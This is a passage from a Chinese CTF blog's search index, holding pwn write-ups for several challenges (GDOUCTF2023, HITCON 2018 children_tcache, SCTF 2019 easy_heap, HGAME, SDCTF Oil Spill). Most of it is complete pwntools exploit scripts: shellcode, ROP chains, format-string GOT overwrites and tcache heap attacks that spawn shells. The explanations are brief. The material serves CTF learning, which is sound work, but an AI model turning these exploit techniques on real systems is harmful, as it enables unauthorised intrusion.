elf=ELF(&amp;quot;./R&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

jmp_rsp=0x40094e
sd=cs.time(0)
cs.srand(sd)

io.recvuntil(b&amp;quot;num:\n&amp;quot;)
io.sendline(str(cs.rand()%50))
io.recvuntil(b&amp;quot;door\n&amp;quot;)

shellcode=asm(&#39;&#39;&#39;
    xor rax,rax  
    shl rdx,12   #计数器，1&amp;lt;&amp;lt;12-&amp;gt;0x40000  nbytes
    mov esi,0x601700  buf=0x601700 
    syscall
    jmp rsi   #迁移到0x601700
&#39;&#39;&#39;)

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(jmp_rsp)+shellcode
io.send(payload)
shellcode=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x601200,0x50)+shellcraft.write(1,0x601200,0x50))
io.send(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">GDOUCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2dY2_XTLi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;测一测&#34;&gt;测一测：&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import time
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./can_can_need&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,20000)
elf=ELF(&amp;quot;./can_can_need&amp;quot;)

io.recvuntil(b&amp;quot;gift?gift!\n&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.recvuntil(b&amp;quot;]\n&amp;quot;)
# io.send(b&amp;quot;%9$p&amp;quot;) #canary

# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;%12$p&amp;quot;) #endbr4
io.recvuntil(b&amp;quot;!&amp;quot;)
# canary=int(io.recv(18),16)
endbr4=int(io.recv(14),16)
# print(&amp;quot;canary:  &amp;quot;+hex(canary))   #泄露canary
print(&amp;quot;endbr4:  &amp;quot;+hex(endbr4))   #泄露endbr4
base_addr=endbr4-0x13e0
sh_addr=base_addr+0x200E
gift=base_addr+0x4040
pop_rdi_ret=base_addr+0x1443 
sys_addr=base_addr+elf.plt[b&amp;quot;system&amp;quot;]



io.recvuntil(b&amp;quot;]\n&amp;quot;)
for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
# payload=b&amp;quot;a&amp;quot;*14+b&amp;quot;+&amp;quot;*8+p64(0)
# io.sendline(payload)
io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
# io.sock.shutdown(1)
io.shutdown(&#39;write&#39;)
# io.shutdown_raw(&#39;write&#39;)
# io.send(payload)

# io.close()




io.interactive()


# Gadgets information
# ============================================================
# 0x000000000000143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001440 : pop r14 ; pop r15 ; ret
# 0x0000000000001442 : pop r15 ; ret
# 0x000000000000143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000001213 : pop rbp ; ret
# 0x0000000000001443 : pop rdi ; ret
# 0x0000000000001441 : pop rsi ; pop r15 ; ret
# 0x000000000000143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000101a : ret
# 0x00000000000013c4 : ret 0x64be

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;5字节格式化字符串泄露栈上地址，利用scanf读入&lt;code&gt;+-&lt;/code&gt;号绕过canary，注意最后一次输入为%d,4字节，而一个64位栈空间8字节，注意计算偏移&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此外最后读入指令也需要考虑%d的问题，分两次读入，第一次读入低字节，第二次读入高字节&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
&lt;/code&gt;&lt;/pre&gt;
">TUT 校赛部分复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gCjQE4_Iw/"" data-c="
          &lt;p&gt;libc-2.27.so,64位保护全开，标准菜单题，不同的是此题申请和后续编辑堆块大小不超过0x40,且没有off by one或者堆溢出等手段，不能像往常一样申请大于smallbin大小的再释放进入unsortedbin泄露或者利用unlink后向合并进入unsortedbin泄露；&lt;br&gt;
但是此题存在指针未清零造成的uaf&lt;br&gt;
可以利用此特点泄露堆地址，然后减去偏移到heap开头处，tcache头部heap+0x10到heap+0x50前（0x40）都是counts，代表的是idx所对应的不同的大小的tcache的个数，而后0x200（0x40*8）为指针数组，存放tcache_entry指针，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x561175c60000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x561175c60250
Size: 0x51
fd: 0x561175c60260

Allocated chunk | PREV_INUSE
Addr: 0x561175c602a0
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x561175c602f0
Size: 0x20d11

pwndbg&amp;gt; x/20gx 0x561175c60000
0x561175c60000: 0x0000000000000000      0x0000000000000251
0x561175c60010: 0x0000000002000000      0x0000000000000000
0x561175c60020: 0x0000000000000000      0x0000000000000000
0x561175c60030: 0x0000000000000000      0x0000000000000000
0x561175c60040: 0x0000000000000000      0x0000000000000000
0x561175c60050: 0x0000000000000000      0x0000000000000000
0x561175c60060: 0x0000000000000000      0x0000561175c60260
0x561175c60070: 0x0000000000000000      0x0000000000000000
0x561175c60080: 0x0000000000000000      0x0000000000000000
0x561175c60090: 0x0000000000000000      0x0000000000000000
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在将chunk放入tcahce的时候会检查&lt;code&gt;tcache-&amp;gt;counts[tc_idx] &amp;lt; mp_.tcache_count&lt;/code&gt;，而我们知道相同大小tcache最多存在7个，即我们只需要将count改为不小于7的某个数即可满足该检查，后续free的堆块不会放入tcache，而counts在heap上，我们只需要修改heap的counts为不小于7的数即可，这道题我们可以利用double free来修改heap上的内容，修改后释放heap，使其进入unsortedbin获取main_arena偏移地址进而泄露libc；&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后将heap重新分配（使用edit after free，后续更改在chunk 0上操作，再次构造double free，之后劫持malloc_hook打one_gadget或者劫持free_hook构造即可getshell，不知道是版本的原因，本题调栈改realloc偏移打one_gadget不行，故最后采用劫持free_hook构造&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./drunk&amp;quot;)
elf=ELF(&amp;quot;./drunk&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;add?\n&amp;quot;,c)

def delete(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;number: \n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;left: \n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;refill\n&amp;quot;,cc)

add(0x40,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;/bin/sh\x00&amp;quot;) #1

delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
shell=libc_addr+one_gadget[2]

edit(4,b&amp;quot;\x00&amp;quot;*0x40)
delete(0)
delete(0)
add(0x40,p64(free_hook))
add(0x40,b&amp;quot;qqq&amp;quot;)
add(0x40,p64(sys_addr))
# add(0x40,p64(malloc_hook-0x8))
# add(0x40,b&amp;quot;qqq&amp;quot;)
# add(0x40,p64(shell)+p64(realloc+0x1))

gdb.attach(io)
pause()

io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;number: \n&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x4f365 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f3c2 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a45c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681961229895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">一道tcache struct题目 drunk 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fYqCaAJM-/"" data-c="
          &lt;p&gt;64位tcachebin attack+off by null，保护全开&lt;br&gt;
标准菜单，此题下标分配是优先占据空闲的下标，从小到大顺序分配，strcpy会在末尾添加&lt;code&gt;\x00&lt;/code&gt;造成off by null&lt;br&gt;
大致思路是unsortedbin leak然后劫持malloc_hook打one_gadget&lt;br&gt;
先放exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29088)
# io=process(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
elf=ELF(&amp;quot;./HITCON_2018_children_tcache&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Data:&amp;quot;,c)

def show(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:&amp;quot;,str(n))

add(0x440,b&amp;quot;aaa&amp;quot;) #0
add(0x68,b&amp;quot;ccc&amp;quot;) #1
add(0x4f0,b&amp;quot;ddd&amp;quot;) #2
add(0x10,b&amp;quot;bbb&amp;quot;) #3

delete(0)
delete(1)

for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) #将逐字节更改直到最后1字节
    delete(0)  #下标空闲即可取

add(0x68,cyclic(0x60)+p64(0x4c0)) #0
delete(2)

add(0x440,b&amp;quot;sss&amp;quot;) #1
show(0)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-0x60-0x3EBC40
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
shell=one_gadget[1]+libc_addr

add(0x68,b&amp;quot;eee&amp;quot;) #2  0,2堆块重叠

delete(0) #main_arena-&amp;gt;0
delete(2) #main_arena-&amp;gt;2-&amp;gt;0    double free

# gdb.attach(io)
# pause()

add(0x68,p64(malloc_hook))
add(0x68,p64(malloc_hook))
add(0x68,p64(shell))

io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive() 

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先分配4个堆块，idx为0和2的堆块大于0x410，chunk 3防止释放时与top chunk合并&lt;br&gt;
但delete函数存在字符污染&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681575273596.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
如果需要进行unlink操作合并前三个chunk需要将chunk 2的presize更改，这里需要用到for循环每一字节更改，最后再add修改presize即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(8):
    add(0x68-i,b&amp;quot;a&amp;quot;*(0x68-i)) 
    delete(0) 
add(0x68,cyclic(0x60)+p64(0x4c0)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681575981844.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
之后再分配堆块，这样不同下标的堆块指向同一块内存空间，可以实现tcachebin attack，最后劫持malloc_hook打one_gadget即可getshell，（劫持free_hook也行&lt;/p&gt;
">hitcon_2018_children_tcache wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7VDd7Yhhb/"" data-c="
          &lt;p&gt;64位tcachebin attack+off by null+chunk overlapping，保护全开&lt;br&gt;
但是存在mmap开辟了一段rwx权限的空间并在程序一开始泄露出来；&lt;br&gt;
此题标准菜单，没有uaf没有堆溢出，但是fill函数里面存在off by null&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452419757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27185)
# io=process(&amp;quot;./sctf_2019_easy_heap&amp;quot;)
elf=ELF(&amp;quot;./sctf_2019_easy_heap&amp;quot;)

def alloc(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def fill(n,c):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,c)

io.recvuntil(b&amp;quot;Mmap: &amp;quot;)
mmap=int(io.recv(12),16)
print(&amp;quot;mmap: &amp;quot;+hex(mmap))

alloc(0x420) #0

alloc(0x38) #1
alloc(0x28) #2
alloc(0x4f0) #3
alloc(0x10) #4

delete(0)
payload=cyclic(0x20)+p64(0x4a0)
fill(2,payload)

delete(3)
delete(1)
delete(2)

alloc(0x460) #0

# gdb.attach(io)
# pause()

alloc(0x520) #1
payload=cyclic(0x420)+p64(0)+p64(0x41)+p64(mmap)
fill(0,payload+b&amp;quot;\n&amp;quot;)

alloc(0x38) #2
alloc(0x38) #3

payload=asm(shellcraft.sh())
fill(3,payload+b&amp;quot;\n&amp;quot;)

fill(1,b&amp;quot;\x30\n&amp;quot;)
alloc(0x28) #5
alloc(0x28) #6
payload=p64(mmap)
fill(6,payload+b&amp;quot;\n&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,b&amp;quot;1&amp;quot;)
print(&amp;quot;asd  &amp;quot;+hex(mmap))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们申请5个chunk，最后一个chunk申请防止后续进行unlink操作时候后向chunk与top chunk合并；&lt;br&gt;
chunk 0和chunk 3大小均大于0x410,否则释放时会被放进tcachebin而不是 unsortedbin中，，首先释放chunk 0，然后修改chunk 3的presize以准备unlink操作（通过fill chunk 2实现，溢出&lt;code&gt;\x00&lt;/code&gt;将&lt;code&gt;0x501&lt;/code&gt;修改为&lt;code&gt;0x500&lt;/code&gt;，此时释放chunk 3 ，可以看到0123都被合并&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452969182.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;，&lt;br&gt;
然后释放1，2堆块&lt;br&gt;
此时我们再分配两个堆块，分别包含0和1，2和3，以实现chunk overlapping，&lt;br&gt;
接下来，修改0，1堆块，堆块0将next指针修改为mmap地址，堆块1将next指针低位字节修改为&lt;code&gt;\x30&lt;/code&gt;使其指向malloc_hook;&lt;br&gt;
接下来就是tcachebin attack过程了，分配堆块到指定内存地址上进行读写，mmap地址写入shellcode,malloc_hook上写入mmap地址；&lt;br&gt;
最后出发malloc_hook，执行shellcode来getshell&lt;/p&gt;
">sctf2019_easy_heap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5-Lmbm_Ch/"" data-c="
          &lt;p&gt;64位劫持got表(注意提前更换libc：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681139324722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一次输入负数绕过长度检查并且可以反向溢出到bss段前的got表，由此第二次输入可以劫持got表内容&lt;br&gt;
劫持exit()为_start，由此可以返回再次输入&lt;br&gt;
接下来泄露libc，注意地址得对齐，因为内存实际地址只有末三位固定，则选择泄露的got表偏移末尾为0的几项都行，为8的不行，注意发送时提前gdb调试获取一下实际地址末尾2位再发送，避免输入修改实际地址&lt;br&gt;
泄露libc后再次返回开头，劫持puts的got表地址为system函数地址，将puts_got-0x8覆盖为&lt;code&gt;/bin/sh\x00&lt;/code&gt;,所以输入-9将输入流定位到偏移0x404010处，即puts_got-0x8处，方便一次性读入然后getshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28201)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

start_addr=elf.sym[b&amp;quot;_start&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-6&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=p64(start_addr)

# gdb.attach(io)
# pause()

io.sendline(payload)


io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-8&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;\xd0&amp;quot;
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-9&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HGAME 2023 week1]choose_the_seat wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/a8Nkgfp0x/"" data-c="
          &lt;p&gt;此题64位格式化字符串劫持got表即可，注意接收和传参，one_gagdet貌似打不通&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681118319987.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./OilSpill&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28755)
elf=ELF(&amp;quot;./OilSpill&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x4007e3
ret=0x400536
x=0x600C80
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

libc_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)-libc.sym[b&amp;quot;puts&amp;quot;]
printf_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
stack_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
# temp=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;printf_addr: &amp;quot;+hex(printf_addr))

# gdb.attach(io)
# pause()


str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
# one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
# shell=one_gadget[1]+libc_addr


io.recvuntil(b&amp;quot;clean it?\n&amp;quot;)
payload=fmtstr_payload(8,{puts_got:sys_addr,x:b&amp;quot;/bin/sh\x00&amp;quot;})
io.sendline(payload)
io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007e0 : pop r14 ; pop r15 ; ret
# 0x00000000004007e2 : pop r15 ; ret
# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005f8 : pop rbp ; ret
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400536 : ret
# 0x00000000004006cb : ret 0x8b48

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">[SDCTF 2022]Oil Spill wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/h-MuOCtcb/"" data-c="
          &lt;p&gt;队伍：😍💵🎃🎃🤣🤣😆😁😁😇😡🎃😆💵☺😇😆😊😁😆😁&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;MISC:&lt;/h2&gt;
&lt;h3 id=&#34;签到&#34;&gt;签到:&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016707539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;base32 解得&lt;/p&gt;
&lt;p&gt;flag{2dfea6c861edabefab189caf42250b20}&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;请对他使用shellcode吧&#34;&gt;请对他使用shellcode吧：&lt;/h3&gt;
&lt;p&gt;主函数mmap开辟一段可写区域，输入往其中填入shellcode，但是lookatme函数有限制&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013489240.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里选择绕过strlen&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013623713.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
所以只需将eax寄存器赋0即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwnme&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,28003)
elf=ELF(&amp;quot;./pwnme&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;quot;)
payload=asm(&#39;mov eax,0x0&#39;)+asm(shellcraft.sh())
gdb.attach(io)
pause()

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;web&#34;&gt;WEB:&lt;/h2&gt;
&lt;h3 id=&#34;web-签到1&#34;&gt;web-签到1:&lt;/h3&gt;
&lt;p&gt;ctfer1和2参数使用强碰撞&lt;/p&gt;
